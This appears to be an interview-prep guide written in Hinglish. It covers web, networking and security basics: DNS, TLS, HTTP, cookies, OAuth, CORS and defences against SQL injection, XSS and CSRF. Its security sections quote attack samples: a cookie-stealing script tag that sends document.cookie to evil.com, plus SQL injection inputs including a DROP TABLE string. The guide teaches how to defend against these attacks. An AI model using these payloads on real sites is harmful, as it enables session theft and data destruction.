# Web aur networking basics

## Browser mein URL daalne se page dikhne tak kya hota hai
Classic sawaal — jitni layers bologe utna achha. Order mein:

1. **URL parse** — protocol (https), domain, path. Browser pehle apna cache/HSTS list dekhta hai (HSTS ho to seedha https).
2. **DNS lookup** — domain → IP. Order: browser cache → OS cache (hosts file) → router → ISP ka resolver → root server → `.com` TLD server → domain ka authoritative server. Jawab TTL tak cache hota hai.
3. **TCP connection** — IP ke port 443 pe **3-way handshake**: SYN → SYN-ACK → ACK.
4. **TLS handshake** — server certificate bhejta hai, browser verify karta hai (trusted CA, domain match, expiry), dono ek shared session key pe agree karte hain. Ab sab encrypted.
5. **HTTP request** — `GET /path` headers ke saath (Host, cookies, User-Agent, Accept).
6. **Server side** — load balancer / reverse proxy (nginx) → app server → DB/cache → response (status code, headers, HTML).
7. **Browser rendering** — HTML parse → **DOM**, CSS parse → **CSSOM**, dono milke **render tree** → **layout** (har element ki position/size) → **paint** → composite. Beech mein `<script>` mile to parsing ruk sakti hai (isliye `defer`/`async`). Images, CSS, JS ke liye aur requests.
8. **JS execute** — SPA (Angular) ho to JS app bootstrap karti hai, API calls karti hai, DOM banati hai.

> DNS → TCP → TLS → HTTP → server → render. Har step pe kuch cache hota hai — isliye doosri baar fast.

## HTTP request aur response ka structure
**Request** ke hisse:
- **Request line** — method, path, version: `POST /api/orders HTTP/1.1`
- **Headers** — `Host`, `Content-Type: application/json`, `Authorization: Bearer ...`, `Accept`, `Cookie`, `User-Agent`
- Khaali line
- **Body** (optional) — JSON, form data. GET mein aam taur pe body nahi.

**Response** ke hisse:
- **Status line** — `HTTP/1.1 201 Created`
- **Headers** — `Content-Type`, `Content-Length`, `Set-Cookie`, `Cache-Control`, `Location` (naye resource ka URL), CORS headers
- **Body** — JSON / HTML

Status code families: **1xx** info, **2xx** success, **3xx** redirect (301 permanent, 302/307 temporary, 304 not modified — cache se lo), **4xx** client ki galti, **5xx** server ki galti.

HTTP **stateless** hai — har request apne aap mein complete; server pichhli request yaad nahi rakhta. State ke liye cookies, tokens, sessions.

```
POST /api/orders HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...

{"productId": 42, "qty": 2}

HTTP/1.1 201 Created
Location: /api/orders/981
Content-Type: application/json

{"id": 981, "status": "Pending"}
```

## HTTP/1.1 vs HTTP/2 vs HTTP/3
| | HTTP/1.1 | HTTP/2 | HTTP/3 |
| --- | --- | --- | --- |
| Format | Text | Binary frames | Binary frames |
| Ek connection pe | Ek request ek waqt (browser 6 connections kholta hai) | **Multiplexing** — bahut saari requests saath | Multiplexing |
| Headers | Har baar poore | **HPACK compression** | QPACK compression |
| Transport | TCP | TCP | **QUIC (UDP pe)** |
| Head-of-line blocking | Haan (HTTP level) | TCP level pe abhi bhi | Nahi |

**HTTP/2** ka main fayda: ek hi TCP connection pe parallel requests — isliye purane tricks (file bundling, domain sharding) ki zaroorat kam. **gRPC HTTP/2 pe chalta hai.**

**HTTP/3** QUIC use karta hai — ek packet kho jaaye to sirf wahi stream rukti hai, baaki nahi; connection setup bhi tez (TLS built-in), aur mobile network badalne (WiFi → 4G) pe connection bana rehta hai.

## Cookies vs localStorage vs sessionStorage
| | Cookie | localStorage | sessionStorage |
| --- | --- | --- | --- |
| Size | ~4 KB | ~5–10 MB | ~5–10 MB |
| Server ko jaata hai? | **Haan, har request mein automatically** | Nahi | Nahi |
| Kab tak | Expiry tak (ya session) | Hamesha, jab tak delete na ho | Tab band hone tak |
| JS se padh sakte? | Haan, jab tak `HttpOnly` na ho | Haan | Haan |
| Scope | Domain + path | Origin | Origin + tab |

**Token kahan rakhein?** — Security ka favourite sawaal:
- **localStorage** — simple, par koi bhi JS padh sakta hai, to **XSS** hua to token chori.
- **HttpOnly + Secure + SameSite cookie** — JS padh hi nahi sakta (XSS se token safe), par cookie automatically jaati hai to **CSRF** ka dhyan (SameSite=Lax/Strict + anti-CSRF token).
- Aam balanced tareeka: short-lived access token **memory** mein, refresh token **HttpOnly cookie** mein.

Cookie flags: **`HttpOnly`** (JS se chhupao), **`Secure`** (sirf HTTPS), **`SameSite`** (cross-site requests pe bhejo ya nahi — Strict/Lax/None), `Domain`, `Path`, `Expires`/`Max-Age`.

## TCP vs UDP
? TCP aur UDP mein farak kya hai? Kab kaunsa use hota hai?
| | TCP | UDP |
| --- | --- | --- |
| Connection | Pehle handshake (connection-oriented) | Seedha bhejo (connectionless) |
| Delivery | Guaranteed, order mein, retransmit | Koi guarantee nahi — kho sakta hai, order badal sakta hai |
| Speed | Thoda slow (ACK, retransmit) | Tez, kam overhead |
| Use | HTTP, DB connections, email, file transfer | Video/voice call, gaming, DNS, live streaming, QUIC |

**TCP stream hai, messages nahi** — ek `send` doosri taraf ek `receive` mein aaye, ye zaroori nahi (tukdon mein ya do messages jud ke aa sakte hain). Isliye apna **message framing** chahiye — length prefix ya delimiter. GPS device servers mein ye important hai.

## DNS kaise kaam karta hai aur record types
DNS = internet ki phone book: naam → IP. Resolution chain: browser/OS cache → **recursive resolver** (ISP ya 8.8.8.8) → **root** server → **TLD** server (`.com`, `.in`) → domain ka **authoritative** nameserver → jawab. Har jawab **TTL** tak cache hota hai (isliye DNS change "propagate" hone mein time lagta hai).

| Record | Kaam |
| --- | --- |
| **A** | Domain → IPv4 address |
| **AAAA** | Domain → IPv6 |
| **CNAME** | Ek naam doosre naam ka alias (`www` → `example.com`) |
| **MX** | Email kis server pe jaaye |
| **TXT** | Text — domain verification, SPF, DKIM, DMARC |
| **NS** | Is domain ke nameservers kaun hain |

## Webhook vs API polling
? Webhook aur polling mein farak kya hai? Webhook receive karte waqt kya dhyan rakhoge?
**Polling** — tum baar-baar server se poochhte ho "kuch naya hua?" (har 10 second GET). Simple, par zyada requests bekaar jaati hain aur update mein delay.

**Webhook** — ulta: jab event hota hai, **server tumhare URL pe HTTP POST** kar deta hai ("payment success hua"). Real-time aur efficient. Payment gateways (Razorpay, Stripe), GitHub, SMS providers yahi karte hain.

Webhook receive karte waqt dhyan:
- **Signature verify** karo (HMAC header) — koi bhi tumhare URL pe fake POST kar sakta hai.
- **Idempotent** raho — same event do baar aa sakta hai (retry); event ID store karke duplicate ignore.
- **Jaldi 200 lautao**, bhaari kaam queue/background mein — warna sender timeout maan ke retry karega.

Aur options: **WebSocket/SignalR** (browser ke saath two-way real-time), **long polling**, **Server-Sent Events** (server → browser one-way).

# Web security

## Hashing vs encryption vs encoding
Teeno alag hain aur interviewer inhe mix karwane ki koshish karta hai:

| | Encoding | Encryption | Hashing |
| --- | --- | --- | --- |
| Maqsad | Data ka **format** badalna (transport ke liye) | **Chhupana** — sirf key wala padhe | **Fingerprint** — verify karna |
| Wapas mil sakta? | Haan, koi bhi (key nahi) | Haan, **key** se | **Nahi** (one-way) |
| Example | Base64, URL encoding, UTF-8 | AES (symmetric), RSA (asymmetric) | SHA-256, bcrypt, Argon2 |
| Use | Binary ko text mein bhejna | Data at rest/in transit, secrets | Passwords, file integrity, signatures |

**Base64 encryption nahi hai** — JWT ka payload Base64 hai, koi bhi decode karke padh sakta hai. Isliye JWT mein secrets mat daalo.

**Symmetric** (AES) — ek hi key se encrypt aur decrypt, tez. **Asymmetric** (RSA, ECC) — public key se encrypt, private key se decrypt (ya private se sign, public se verify); slow, isliye TLS mein sirf key exchange ke liye.

! "Password encrypt karke store karte hain" — galat. Password **hash** hota hai (salt ke saath, slow algorithm). Encrypt kiya to key wala sab passwords padh sakta hai.

## Password kaise store karein — salting, bcrypt
**Kabhi plain text nahi, kabhi encrypt nahi — hash karo.** Par simple SHA-256 bhi kaafi nahi:

- **Salt** — har user ke liye random value jo password ke saath hash hoti hai aur hash ke saath store hoti hai. Bina salt ke same password = same hash, aur **rainbow tables** (pre-computed hashes) se turant crack. Salt ke saath har hash unique.
- **Slow algorithm** — SHA-256 bahut **tez** hai, GPU pe arabon guesses per second. Password ke liye jaan-boojh ke slow algorithms: **bcrypt**, **PBKDF2**, **Argon2** (sabse modern). Inme **work factor/cost** hota hai jo hardware tez hone pe badhate hain.
- **Pepper** (optional) — ek secret jo DB mein nahi, config/Key Vault mein; DB leak ho to bhi akela kaafi nahi.

Login pe: user ka salt nikaalo, diye password ko same salt + algorithm se hash karo, stored hash se compare (constant-time).

ASP.NET Core **Identity** ka `PasswordHasher` PBKDF2 + salt already karta hai — khud crypto mat likho.

```csharp
// BCrypt.Net-Next package — salt khud generate aur hash mein embed karta hai
string hash = BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
bool ok = BCrypt.Net.BCrypt.Verify(inputPassword, hash);
```

## HTTPS / TLS handshake kaise kaam karta hai
HTTPS = HTTP + **TLS** encryption. Teen cheezein deta hai: **confidentiality** (beech mein koi padh nahi sakta), **integrity** (koi badal nahi sakta), **authentication** (tum sahi server se baat kar rahe ho).

**Handshake (simplified, TLS 1.3):**
1. **Client Hello** — browser supported ciphers aur apna key share bhejta hai.
2. **Server Hello + Certificate** — server cipher chunta hai, apna key share aur **certificate** (public key + domain + CA ka signature) bhejta hai.
3. **Verify** — browser check karta hai: certificate trusted **CA** ne sign kiya, domain match, expire nahi hua.
4. Dono taraf key shares se **same session key** calculate hoti hai (Diffie-Hellman) — ye key kabhi network pe nahi jaati.
5. Ab saara data **symmetric encryption** (AES) se — tez.

Asymmetric crypto sirf shuru mein (identity + key agreement), baaki symmetric — kyunki asymmetric slow hai.

**Certificate expire** ho jaaye to browser warning, API clients fail — isliye Let's Encrypt + auto-renew (certbot timer). TLS 1.0/1.1 purane aur insecure — minimum 1.2.

## SQL injection aur bachav
? SQL injection kya hai aur .NET mein isse kaise bachoge?
**Kya hai**: user input seedha SQL string mein joda gaya to attacker input mein SQL likh ke query badal deta hai.

Input `' OR '1'='1` → `WHERE name = '' OR '1'='1'` → saari rows. Ya `'; DROP TABLE users; --`.

**Bachav:**
- **Parameterized queries** — input hamesha **data** maana jaata hai, SQL code nahi. ADO.NET `SqlParameter`, Dapper `@param`, EF Core LINQ (automatically parameterized).
- EF Core `FromSqlInterpolated` / `FromSql($"...")` safe hai (interpolation parameter ban jaata hai); **`FromSqlRaw` mein string concat** mat karo.
- Least-privilege DB user — app ka user `DROP` na kar sake.
- Input validation (defence in depth, akela kaafi nahi).
- Dynamic column/table names parameter nahi ho sakte — unko **whitelist** se check karo.

```csharp
// GALAT — injection
var sql = "SELECT * FROM Users WHERE Name = '" + name + "'";

// SAHI — parameter
using var cmd = new NpgsqlCommand("SELECT * FROM users WHERE name = @name", conn);
cmd.Parameters.AddWithValue("name", name);

// EF Core — safe (interpolation → parameter)
var users = db.Users.FromSql($"SELECT * FROM users WHERE name = {name}").ToList();
```

## XSS — Cross-Site Scripting
? XSS kya hai aur Angular isse kaise bachata hai?
**Kya hai**: attacker tumhare page pe apni **JavaScript** chalwa deta hai — jaise comment mein `<script>fetch('evil.com?c='+document.cookie)</script>` daala, aur jo bhi page khole uske browser mein chal gaya. Token/cookie chori, user ki taraf se actions.

Types: **Stored** (DB mein save, sabko dikhe — sabse khatarnak), **Reflected** (URL parameter se turant page pe), **DOM-based** (client JS khud unsafe tareeke se DOM mein daale).

**Bachav:**
- **Output encoding** — user data ko HTML mein daalte waqt escape (`<` → `&lt;`). **Angular** `{{ }}` interpolation automatically escape karta hai, `[innerHTML]` sanitize karta hai. Razor `@` bhi encode karta hai.
- `bypassSecurityTrustHtml` / `Html.Raw` / `innerHTML` direct — sirf trusted data pe.
- **HttpOnly cookies** — XSS ho bhi jaaye to cookie JS se padh nahi sakte.
- **Content-Security-Policy (CSP)** header — kaunse sources se script chal sakti hai; inline scripts block.
- Input validation / rich text ke liye sanitizer library.

## CSRF — Cross-Site Request Forgery
**Kya hai**: user tumhari site pe logged in hai (cookie browser mein). Wo ek evil site kholta hai jisme hidden form hai jo **tumhari site pe POST** karta hai (`/transfer?to=attacker`). Browser **cookie automatically bhej deta hai**, to server ko lagta hai user ne khud request ki.

CSRF tabhi hota hai jab auth **cookie-based** ho. Agar token `Authorization: Bearer` header mein JS se bhejte ho (localStorage/memory se), to evil site wo header nahi laga sakti — CSRF ka khatra nahi (par XSS ka hai).

**Bachav:**
- **SameSite cookie** (`Lax` / `Strict`) — cross-site requests pe cookie nahi jaati. Modern browsers mein default Lax.
- **Anti-forgery token** — server form ke saath ek random token deta hai jo evil site ko pata nahi hota; ASP.NET `[ValidateAntiForgeryToken]`, Angular `HttpClient` XSRF-TOKEN cookie → header automatically.
- GET se state kabhi mat badlo.

**XSS vs CSRF yaad rakhne ka tareeka**: XSS = attacker ka code **tumhari site pe** chalta hai. CSRF = attacker ki site tumhari site pe **user ke naam se request** bhejti hai.

## OAuth 2.0 aur OpenID Connect
**OAuth 2.0** = **authorization** — "is app ko meri taraf se X karne ki permission do" (bina password diye). Access token deta hai. Example: "Login with Google" wala app tumhari Google Drive padhe.

**OpenID Connect (OIDC)** = OAuth 2.0 ke upar **authentication** layer — "ye user kaun hai". Extra **ID token** (JWT, user info ke saath) deta hai.

Roles: **Resource Owner** (user), **Client** (tumhara app), **Authorization Server** (Keycloak, Azure AD/Entra, Google — token deta hai), **Resource Server** (API jo token check karti hai).

**Main flows (grant types):**
- **Authorization Code + PKCE** — web/SPA/mobile apps ke liye standard. User login page pe redirect → code wapas → code ko token se exchange. PKCE code chori hone se bachata hai. SPA (Angular) ke liye yahi.
- **Client Credentials** — service-to-service, koi user nahi (backend job doosri API bulaye).
- **Refresh token** — access token expire hone pe naya lena bina dobara login.
- Implicit aur Password grant — **deprecated**, mat use karo.

API side pe ASP.NET Core: `AddAuthentication().AddJwtBearer(o => { o.Authority = "https://idp/realms/x"; o.Audience = "my-api"; })` — signature, issuer, audience, expiry khud verify.

## Keycloak / Identity server kya karta hai
**Keycloak** ek open-source **Identity and Access Management (IAM / IDAM)** server hai — login, users, roles, tokens sab ek jagah; har app ko apna login system nahi banana padta.

Features:
- **SSO (Single Sign-On)** — ek baar login, saare connected apps mein logged in.
- **OAuth2 / OIDC / SAML** tokens issue karta hai.
- Users, groups, **roles** (realm roles, client roles) manage.
- MFA, password policies, social login (Google), LDAP/AD integration.
- **Realm** = alag tenant (users/clients ka set), **Client** = ek app jo Keycloak use karti hai.

Flow: Angular app user ko Keycloak login page pe bhejti hai → login → token wapas → Angular har API call pe `Authorization: Bearer` lagati hai → .NET API token ka signature Keycloak ki public keys (JWKS endpoint) se verify karti hai aur roles claims se authorize karti hai.

Doosre options: Azure AD / Entra ID, Auth0, Okta, Duende IdentityServer.

## Rate limiting aur DDoS se bachav
**Rate limiting** — ek client (IP / user / API key) kitni requests kitne time mein kar sakta hai; limit paar to **429 Too Many Requests** (+ `Retry-After` header). Brute-force login, scraping, abuse aur accidental overload se bachata hai.

Algorithms: **Fixed window** (har minute 100 — simple, par window boundary pe burst), **Sliding window** (smooth), **Token bucket** (bucket mein tokens refill hote hain, burst allow karta hai — sabse common), **Concurrency limit**.

.NET 7+ mein built-in: `AddRateLimiter` + `[EnableRateLimiting("policy")]`. Multiple servers ho to counter **Redis** mein rakho, warna har server alag ginega.

**DDoS** (bahut saari machines se flood) app level pe nahi rukta — **edge pe** rokte hain: Cloudflare / AWS Shield / Azure DDoS protection, WAF, CDN, load balancer, auto-scaling. App ka rate limiter sirf last layer hai.

```csharp
builder.Services.AddRateLimiter(o =>
{
    o.RejectionStatusCode = 429;
    o.AddFixedWindowLimiter("login", x => { x.PermitLimit = 5; x.Window = TimeSpan.FromMinutes(1); });
});
app.UseRateLimiter();

app.MapPost("/login", Login).RequireRateLimiting("login");
```

## OWASP Top 10 — short mein
OWASP Top 10 web apps ke sabse common security risks ki list hai. Interviewer aksar "kuch naam batao aur kaise bachoge" poochhta hai:

- **Broken Access Control** (No. 1) — user doosre ka data dekh le (`/api/orders/123` badal ke 124). Har request pe server side check: ye resource is user ka hai kya.
- **Cryptographic Failures** — plain text passwords, HTTP, weak algorithms.
- **Injection** — SQL, command injection → parameterized queries.
- **Insecure Design** — design mein hi security nahi socha.
- **Security Misconfiguration** — default passwords, detailed error pages production mein, khule ports, CORS `*`.
- **Vulnerable Components** — purane NuGet/npm packages with known CVEs → `dotnet list package --vulnerable`, `npm audit`.
- **Authentication Failures** — weak passwords, no rate limit on login, session fixation.
- **Integrity Failures** — unsigned updates, insecure deserialization.
- **Logging & Monitoring Failures** — attack hua aur pata hi nahi chala.
- **SSRF** — server se attacker ke diye URL pe request karwana (internal services tak pahunch).

## CORS kya hai aur kyun error aata hai
**Same-Origin Policy**: browser ek origin (protocol + domain + port) ke page ko doosre origin ki API ka response **padhne nahi deta** — security ke liye. Angular `localhost:4200` se API `localhost:5000` = alag origin.

**CORS** (Cross-Origin Resource Sharing) — server headers se batata hai ki kaunse origins allowed hain: `Access-Control-Allow-Origin: https://app.example.com`.

**Preflight**: non-simple requests (PUT/DELETE, `Content-Type: application/json`, custom headers jaise Authorization) se pehle browser **OPTIONS** request bhejta hai — server allow kare tabhi asli request.

Dhyan:
- CORS **browser** enforce karta hai — Postman/curl pe koi CORS nahi. Isliye "Postman mein chalta hai, browser mein nahi" = CORS.
- CORS security ka server-side protection **nahi** hai — sirf browsers ko rokta hai.
- `AllowAnyOrigin()` ke saath `AllowCredentials()` allowed nahi — specific origins do.
- ASP.NET mein `UseCors` sahi order mein (routing ke baad, auth se pehle).

```csharp
builder.Services.AddCors(o => o.AddPolicy("spa", p =>
    p.WithOrigins("https://app.example.com").AllowAnyHeader().AllowAnyMethod().AllowCredentials()));
app.UseCors("spa");
```
